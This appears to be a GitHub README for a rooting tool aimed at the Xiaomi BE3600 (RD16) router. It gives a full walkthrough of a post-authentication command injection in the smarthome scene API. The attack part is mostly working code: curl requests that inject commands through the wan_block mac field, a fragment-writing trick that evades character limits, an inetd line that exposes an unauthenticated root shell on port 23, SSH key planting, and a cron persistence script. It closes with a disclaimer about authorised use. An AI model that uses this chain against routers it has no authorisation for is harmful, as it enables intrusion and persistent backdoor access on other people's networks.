# Xiaomi BE3600 (RD16) — SmartHome Scene Command Injection → Root Shell / SSH

> Verified device: **Xiaomi BE3600 router (internal model RD16, CN)**
> Verified firmware: **MIUI ROM 1.0.41 release** (built 2025-04-01, Qualcomm IPQ5312 / ARMv7 / OpenWrt 18.06 / busybox 1.36.1)
> Vulnerability type: **post-auth command injection** (requires the web admin password)
> Impact: full root shell plus persistent SSH
>
> 中文文档：[README.md](README.md)

## Main path

```
web admin password
    │
    ▼
POST api/xqsystem/login ─────────────────────► stok token
    │
    ▼
POST api/xqsmarthome/request_smartcontroller
  scene_setting: wan_block action mac field contains \n
    │   smartcontroller splices mac unsanitized into
    │   system("/usr/sbin/sysapi macfilter set mac=%s wan=%s;... commit")
    ▼
scene_start ──► injected command runs as root (≤18 chars each)
    │
    ▼
fragment writer (echo -n F>/tmp/N + cat /tmp/?>x + sh x)
    │   works around the 18-char and charset limits
    ▼
inetd.conf + /usr/sbin/inetd ──► :23 / :2323 unauthenticated root /bin/sh
    │
    ▼
/data + /etc/crontabs (sec_cfg) ──► per-minute self-heal watchdog
dropbear + authorized_keys ────► :22 SSH (key and password auth)
```

- **Post-auth RCE**: the admin password is required to reach the injection endpoint; this is not an unauthenticated RCE
- Every legacy injection point used by XMiR-Patcher (`start_binding` etc.) is patched in 1.0.41; `wan_block` is the only live injection surface confirmed on this firmware
- `/etc` is ramfs (rebuilt at boot); only `/data` (UBIFS) and `/etc/crontabs` (sec_cfg ext4) persist

## Measured constraints

| Constraint | Detail |
|---|---|
| Command length | ≤18 chars per injected command (fortify `snprintf` bound) |
| Banned chars | `' " ; | $ &` backtick `\`; real newline via double-JSON `\\n` |
| Scene shape | one action per scene (multi-action scenes crash the daemon) |
| Long-lived procs | `system()` waits on pipe EOF — daemons must go through a file or procd, never run directly |
| Digit-ending frags | `echo -n ..D>/tmp/N` (D a digit) becomes an `D>` fd redirect writing nothing — pad with ` >` |
| Writable areas | `/etc` ramfs wiped on boot; `/data`, `/etc/crontabs`, `/etc/config` persist |

## Quick start (exploit.py)

```bash
git clone https://github.com/ChiphaLo/xiaomi-be3600-rd16-ssh.git && cd xiaomi-be3600-rd16-ssh

python3 exploit.py --ip 192.168.31.1 --password 'YOUR_ADMIN_PASSWORD' --stage shell
# then: nc <router-ip> 23  ->  root /bin/sh

python3 exploit.py --ip 192.168.31.1 --password 'YOUR_ADMIN_PASSWORD' --stage persist \
    --pubkey 'ssh-rsa AAAA...your public key'
# SSH (:22) + shell (:23/:2323) auto-recover after every reboot
```

Stdlib only; performs login → injection → inetd → optional persistence.

## Fragment-write technique

18 chars can't hold a real command, so script content is emitted ≤3 bytes at a time:

```sh
echo -n nvr>/tmp/0     # file /tmp/0 = "nvr"
echo -n am >/tmp/1     # arg splitting yields a real space -> "am "
echo -n 2 >/tmp/2      # digit-ending frag needs ' >' or it's an fd redirect
cat /tmp/?>/tmp/x      # reassemble in glob order
sh /tmp/x
```

## Full manual walkthrough

Same as what `exploit.py` automates — every step independently verifiable.

### 0. Prerequisites

- Computer on the same LAN, `http://<AP_IP>/cgi-bin/luci` reachable
- Web admin password

### 1. Login for token

```bash
TOK=$(curl -s -X POST 'http://192.168.31.1/cgi-bin/luci/api/xqsystem/login' \
    --data 'username=admin&password=PASSWORD&logtype=2' \
    | grep -o '"token":"[^"]*"' | cut -d'"' -f4)
```

> The login body must go via `--data`; `--data-urlencode` breaks the `&` separators.

### 2. Command channel: scene + wan_block

```bash
curl -s -X POST \
  "http://192.168.31.1/cgi-bin/luci/;stok=$TOK/api/xqsmarthome/request_smartcontroller" \
  --data-urlencode 'payload={"command":"scene_setting","id":0,"name":"x","launch":{"mode":"home"},"action_list":[{"thirdParty":"xmrouter","type":"wan_block","delay":0,"payload":"{\"command\": \"wan_block\", \"mac\": \"AA\nid>/tmp/messages\n\"}"}]}'
# -> {"code":0,"id":<sid>}

curl -s -X POST \
  "http://192.168.31.1/cgi-bin/luci/;stok=$TOK/api/xqsmarthome/request_smartcontroller" \
  --data-urlencode 'payload={"command":"scene_start","id":<sid>}'
```

`mac` is `AA\n<CMD>\n`; the injected line runs in parallel with the `macfilter commit` tail.

### 3. Read-back channel

`/tmp/messages` ships inside the syslog tarball — copy any file there via the same channel, then download:

```bash
F=$(curl -s "http://192.168.31.1/cgi-bin/luci/;stok=$TOK/api/misystem/sys_log" \
    | grep -o '"file":"[^"]*"' | cut -d'"' -f4)
curl -s -o sl.tar.gz \
  "http://192.168.31.1/cgi-bin/luci/;stok=$TOK/api/misystem/c_download/$F"
tar -xzf sl.tar.gz -C sl && head sl/tmp/messages
```

The tarball also carries `stat/system-02-ps.txt`, `stat/hardware-01-bdata.txt`, `stat/firewall-01-iptable.txt` — live process/nvram/iptables dumps.

### 4. Long scripts via fragments

Each scene action only fits `echo -n F>/tmp/N` — slice the script:

```sh
rm -f /tmp/?                          # clear single-char files
echo -n nvr>/tmp/0; echo -n am >/tmp/1
echo -n 2 >/tmp/2                     # digit-ending needs ' >'
cat /tmp/?>/tmp/x                     # reassemble
sh /tmp/x
```

Single-char names `0-9a-z` (36 slots); `cat /tmp/?>/tmp/xx` moves to a 2-char name for longer scripts.

### 5. Shell via inetd

Bare `telnetd` exits on the `nvram get telnet_en` / `bdata get telnet_en` check; the official `set_telnet` API is gated by `apps.telnet`. inetd does not check:

```sh
# script content (written via fragments)
cp /tmp/ii /etc/inetd.conf
inetd
```

`/tmp/ii` = `23 stream tcp nowait root /bin/sh sh`. Then `nc <ip> 23` → unauthenticated root shell.

### 6. SSH (recommended)

```sh
rm /etc/dropbear/dropbear_rsa_host_key       # 0-byte placeholder must go first
dropbearkey -t rsa -f /data/dropbear_rsa_host_key   # ~1 min, lands on /data (persistent)
mkdir -p /etc/dropbear
echo 'your ssh-rsa pubkey' > /etc/dropbear/authorized_keys
/usr/sbin/dropbear -r /data/dropbear_rsa_host_key -B
```

`ssh -i <privkey> root@<ip>` works. This firmware's musl lacks `$6$` SHA-512 crypt — use `$1$` md5 for password auth.

### 7. Persistence

`/etc` is ramfs (rebuilt from squashfs at boot), but `/data` (UBIFS) and `/etc/crontabs` (sec_cfg ext4) survive. `/data/persist.sh`:

```sh
#!/bin/sh
mkdir -p /etc/dropbear
cp /data/authorized_keys /etc/dropbear/authorized_keys 2>/dev/null
cp /data/inetd.conf /etc/inetd.conf 2>/dev/null
pgrep -x inetd    >/dev/null 2>&1 || /usr/sbin/inetd
pgrep -x dropbear >/dev/null 2>&1 || \
    /usr/sbin/dropbear -r /data/dropbear_rsa_host_key -B
```

Append to `/etc/crontabs/root` (persistent via sec_cfg):

```
* * * * * sh /data/persist.sh >/dev/null 2>&1
```

inetd + dropbear self-heal within ~1 minute of every boot.

## Files

- `exploit.py` — single-file tool (stdlib only): login → inject → inetd → optional persistence
- `docs/TECHNICAL_EN.md` — injection-point disassembly, limit derivation, fd-redirect pitfall, alternate channels
- `docs/TECHNICAL.md` — 中文技术细节
- `README.md` — 中文说明

## Disclaimer

Only use on devices you own or are authorized to test. This is a **post-auth** bug (requires the admin password), not an unauthenticated RCE; if you find an unauthenticated variant of the same sink, use vendor-coordinated disclosure.

## License

MIT
